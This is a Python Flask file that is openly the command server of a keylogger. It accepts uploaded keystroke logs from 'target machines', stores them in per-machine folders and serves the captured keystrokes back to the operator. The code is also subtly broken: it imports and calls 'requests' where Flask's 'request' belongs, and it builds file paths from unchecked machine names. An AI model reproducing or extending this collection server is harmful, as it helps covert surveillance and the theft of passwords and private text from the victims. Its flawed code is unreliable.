from flask import Flask, jsonify, requests
import os
import datetime

app = Flask(__name__)
DATA_FOLDER = "data"
if not os.path.exists(DATA_FOLDER):
    os.makedirs(DATA_FOLDER)

def generate_log_filename():
    return "log_" + datetime.datetime.now().strftime("%Y_%m_%d-%H:%M:%S") + ".txt"

@app.route("/")
def home():
    return "KeyLogger Server is Running"

@app.route("/api/upload", methods=["POST"])
def upload():
    data = requests.get_json()
    if not data or "machine" not in data or "data" not in data:
        return jsonify({"error": "Invalid payload"}), 400

    machine = data["machine"]
    log_data = data["data"]

    machine_folder = os.path.join(DATA_FOLDER, machine)
    if not os.path.exists(machine_folder):
        os.makedirs(machine_folder)

    filename = generate_log_filename()
    file_path = os.path.join(machine_folder, filename)

    with open(file_path, "w", encoding="utf-8") as f:
        f.write(log_data)
    return jsonify({"status": "success", "file": file_path}), 200

@app.route("/api/get_target_machines_list", methods=["GET"])
def get_target_machines_list():
    machines= [d for d in os.listdir(DATA_FOLDER) if os.path.isdir(os.path.join(DATA_FOLDER, d))]
    return jsonify(machines)

@app.route("/api/keystrokes_get", methods=["GET"])
def keystrokes_get():
    target_machine = requests.args.get('machine')
    if not target_machine:
        return jsonify({"error": "Machine not found"}), 400

    machine_folder = os.path.join(DATA_FOLDER, target_machine)
    if not os.path.exists(machine_folder) or not os.path.isdir(machine_folder):
        return jsonify({"error": "Machine not found"}), 400

    all_keystrokes = []
    for filename in sorted(os.listdir(machine_folder)):
        file_path = os.path.join(machine_folder, filename)
        if os.path.isfile(file_path):
            with open(file_path, "r", encoding="utf-8") as f:
                content = f.read()
                all_keystrokes.append({"filename": filename, "content": content})
    return jsonify({"keystrokes": all_keystrokes}), 200

if __name__ == "__main__":
    app.run(debug=True)






